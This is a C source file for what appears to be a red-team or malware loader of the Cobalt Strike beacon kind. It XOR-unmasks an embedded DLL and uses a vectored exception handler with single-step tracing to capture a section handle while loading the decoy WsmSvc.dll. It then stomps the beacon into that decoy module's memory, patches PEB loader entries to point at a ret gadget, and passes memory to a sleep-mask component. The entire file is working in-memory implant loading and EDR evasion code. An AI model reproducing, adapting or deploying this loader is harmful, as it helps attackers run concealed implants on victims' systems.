#include <windows.h>
#include "loader.h"
#include "memory.h"
#include "tcg.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree    ( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$LoadLibraryExW ( LPCWSTR, HANDLE, DWORD );
NTSYSCALLAPI void*    NTAPI NTDLL$memset             (void*, int, size_t);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
NTSYSCALLAPI void*    NTAPI NTDLL$memcpy             (void*, const void*, size_t);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose ( HANDLE Handle );
DECLSPEC_IMPORT NTSTATUS NTAPI  NTDLL$NtMapViewOfSection ( HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$DuplicateHandle ( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
DECLSPEC_IMPORT NTSTATUS NTAPI  NTDLL$NtCreateSection    ( PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE );
DECLSPEC_IMPORT void*    __cdecl MSVCRT$calloc           ( size_t, size_t );
DECLSPEC_IMPORT PVOID    WINAPI KERNEL32$AddVectoredExceptionHandler ( ULONG, PVECTORED_EXCEPTION_HANDLER );

char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );
char _MASK_ [ 0 ] __attribute__ ( ( section ( "mask" ) ) );
char _DLL_  [ 0 ] __attribute__ ( ( section ( "dll" ) ) );

int __tag_setup_hooks  ( );
int __tag_setup_memory ( );

typedef void ( * SETUP_HOOKS ) ( IMPORTFUNCS * funcs );
typedef void ( * SETUP_MEMORY ) ( MEMORY_LAYOUT * layout );


void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY * dll_memory )
{
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;

    section_hdr  = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( int i = 0; i < section_count; i++ )
    {
        section_dst  = dst + section_hdr->VirtualAddress;
        section_size = section_hdr->SizeOfRawData;

        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) {
            new_protect = PAGE_WRITECOPY;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) {
            new_protect = PAGE_READONLY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_READWRITE;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            new_protect = PAGE_EXECUTE;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_EXECUTE_WRITECOPY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
            new_protect = PAGE_EXECUTE_READ;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
            new_protect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );

        /* track memory */
        dll_memory->Sections[ i ].BaseAddress     = section_dst;
        dll_memory->Sections[ i ].Size            = section_size;
        dll_memory->Sections[ i ].CurrentProtect  = new_protect;
        dll_memory->Sections[ i ].PreviousProtect = new_protect;

        /* advance to section */
        section_hdr++;
    }

    dll_memory->Count = section_count;
}
DECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char* format, ...);
DECLSPEC_IMPORT int __cdecl MSVCRT$getchar(void);


pSacData g_SacData;

LONG VectoredHandleree(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        

        
        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)KERNEL32$LoadLibraryExW) {
            MSVCRT$printf("[*] Hit LoadLibraryExW, loading the AMMO!\n");
            g_SacData->Loaded = TRUE;
            
        }


        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)NTDLL$NtCreateSection) {
            if(g_SacData->Loaded) {
                MSVCRT$printf("[*] Hit NtCreateSection!\n");
                ExceptionInfo->ContextRecord->Rdx = 0x10000000 | 0xF001F;
                
            }
        }

        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)NTDLL$NtClose) {
            if(g_SacData->Loaded) {
                
                g_SacData->pSacHandle = (HANDLE)ExceptionInfo->ContextRecord->Rcx;
                ExceptionInfo->ContextRecord->Rcx = 0;
                MSVCRT$printf("[*] Got handle from NtClose : %p\n", g_SacData->pSacHandle);
                ExceptionInfo->ContextRecord->EFlags &= ~0x100;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        ExceptionInfo->ContextRecord->EFlags |= 0x100;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char*, const char*);

PVOID find_gadget_ret() {
    HMODULE hNt = KERNEL32$GetModuleHandleA("ntdll.dll");
    PIMAGE_NT_HEADERS NtDll = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNt + ((PIMAGE_DOS_HEADER)hNt)->e_lfanew);
    PIMAGE_SECTION_HEADER scDll = IMAGE_FIRST_SECTION(NtDll);
    for (int i = 0; i < NtDll->FileHeader.NumberOfSections; i++) {
        if (MSVCRT$strcmp(".text", (const char*)scDll[i].Name) == 0) {
            PBYTE txtBase = (PBYTE)((ULONG_PTR)hNt + scDll[i].VirtualAddress);
            DWORD sizee = scDll[i].Misc.VirtualSize;

            for (DWORD ii = 0; ii < sizee; ii++) {
                if (txtBase[ii] == 0xC3) {
                    return (PVOID)(txtBase + ii);
                }
            }
        }
    }
    return NULL;
}

void fix_peb_entry(PVOID pDll)
{
    PEB_LDR_DATA2 *Ldr = (PEB_LDR_DATA2 *)(*(PVOID **)(__readgsqword(0x60) + 0x18));
    LIST_ENTRY *Head  = &Ldr->InLoadOrderModuleList;
    LIST_ENTRY *Entry = Head->Flink;

    for (; Head != Entry; Entry = Entry->Flink) {
        LDR_DATA_TABLE_ENTRY2 *Data = (LDR_DATA_TABLE_ENTRY2 *)Entry;

        if (Data->DllBase == pDll) {
            Data->EntryPoint            = find_gadget_ret();
            Data->ImageDll              = 1;
            Data->LoadNotificationsSent = 1;
            return;
        }
    }
}

void go ( )
{
    /* populate funcs */
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;
    MSVCRT$printf("[*] Wait - this could take a minute\n");
    typedef PVOID (WINAPI* fn_AddVEH)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
    g_SacData = MSVCRT$calloc(1, sizeof(_SacData));
    if(!g_SacData){
        return;
    } 
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll"); // TODO - For some reason it won't work without with the MODULE$FUNCTION < Need to do more testing !
    fn_AddVEH pAddVEH = (fn_AddVEH)GetProcAddress(hNtdll, "RtlAddVectoredExceptionHandler");
    PVOID hVeh = pAddVEH(1, (PVECTORED_EXCEPTION_HANDLER)VectoredHandleree);
    /* load the pico */
    char * pico_src = GETRESOURCE ( _PICO_ );

    /* allocate memory for it */
    char * pico_data = KERNEL32$VirtualAlloc ( NULL, PicoDataSize ( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
    char * pico_code = KERNEL32$VirtualAlloc ( NULL, PicoCodeSize ( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* load it into memory */
    PicoLoad ( &funcs, pico_src, pico_code, pico_data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect ( pico_code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

    /* begin tracking memory allocations */
    MEMORY_LAYOUT memory    = { 0 };

    memory.Pico.Data = pico_data;
    memory.Pico.Code = pico_code;
    memory.PICO_SIZE = PicoCodeSize(pico_src); //Added to make PICO part of the sleep mask - MAKE SURE TO REMOVE ATTACH VirtualProtectt from the PICO.SPEC

    /* call setup_hooks to overwrite funcs.GetProcAddress */
    ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_code, __tag_setup_hooks ( ) ) ) ( &funcs );

    /* now load the dll (it's masked) */
    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );

    /* load dll into memory and unmask it */
    char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    for ( int i = 0; i < masked_dll->len; i++ ) {
        dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
    }

    DLLDATA dll_data;

    ParseDLL ( dll_src, &dll_data );


        __asm__ __volatile__ (
    ".intel_syntax noprefix\n"
    "pushfq\n"
    "or qword ptr [rsp], 0x100\n"
    "popfq\n"
    ".att_syntax\n"
    );
    HANDLE hDecoy_dst = KERNEL32$LoadLibraryExW(L"WsmSvc.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);

    typedef ULONG (WINAPI* fn_RemoveVEH)(PVOID Handle);

    fn_RemoveVEH pRemoveVEH = (fn_RemoveVEH)GetProcAddress(hNtdll, "RtlRemoveVectoredExceptionHandler");
    pRemoveVEH(hVeh); // remove the VEH

    PIMAGE_NT_HEADERS32 nt_hDecoy_dst = (PIMAGE_NT_HEADERS32)((ULONG_PTR)hDecoy_dst + ((PIMAGE_DOS_HEADER)hDecoy_dst)->e_lfanew);
    //checking if size is not a problem

    SIZE_T becSize = SizeOfDLL(&dll_data);
    if(becSize > nt_hDecoy_dst->OptionalHeader.SizeOfImage) {
        
        return;
    }
    DWORD old_protect_decory = 0;
    KERNEL32$VirtualProtect(hDecoy_dst, 0x1000, PAGE_READWRITE, &old_protect_decory);
    PIMAGE_SECTION_HEADER sc_hDecoy_dst = IMAGE_FIRST_SECTION(nt_hDecoy_dst);
    
    // MAKE all sections writable
    for (int j = 0; j < nt_hDecoy_dst->FileHeader.NumberOfSections; j++) {
        DWORD oldp = 0;
        if(sc_hDecoy_dst[j].VirtualAddress && sc_hDecoy_dst[j].Misc.VirtualSize) {
            PVOID psc_hDecoy_dst = (PVOID)((ULONG_PTR)hDecoy_dst + (ULONG_PTR)sc_hDecoy_dst[j].VirtualAddress);
            if(!(KERNEL32$VirtualProtect(psc_hDecoy_dst, sc_hDecoy_dst[j].Misc.VirtualSize, PAGE_READWRITE, &oldp))) {
                return;
            }
        }
    }

    dprintf("[*] DONE RW FLIPPING EACH SECTION %p \n", (PVOID)hDecoy_dst);
    NTDLL$memset(hDecoy_dst, 0, becSize); //zero it out for the beacon

    LoadDLL ( &dll_data, dll_src, hDecoy_dst );
    SIZE_T old_size = SizeOfDLL ( &dll_data ); 
    /* track dll's memory */
    PVOID new_base = (PVOID)((ULONG_PTR)hDecoy_dst + 0x1000);
    SIZE_T new_size =  old_size - 0x1000;
    //passing the new mem to pico for the sleep mask
    memory.Dll.BaseAddress = ( PVOID ) new_base;
    memory.Dll.Size        = new_size;
    //passing the handle from the VEH to the PICO to load/unload module
    memory.pHandle = g_SacData->pSacHandle;
    ProcessImports ( &funcs, &dll_data, hDecoy_dst );
    fix_section_permissions ( &dll_data, dll_src, hDecoy_dst, &memory.Dll );
    DWORD olda = 0;
    KERNEL32$VirtualProtect(hDecoy_dst, dll_data.OptionalHeader->SizeOfHeaders, PAGE_READONLY, &olda);
    /* call setup_memory to give PICO the memory info */
    ( ( SETUP_MEMORY ) PicoGetExport ( pico_src, pico_code, __tag_setup_memory ( ) ) ) ( &memory );

    /* now run the DLL */
    DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, hDecoy_dst );
    /* free the unmasked copy */
    KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );
    //patching the peb entries 
    fix_peb_entry((PVOID)hDecoy_dst);
    entry_point ( ( HINSTANCE ) hDecoy_dst, DLL_PROCESS_ATTACH, NULL );
    entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, NULL ); 
}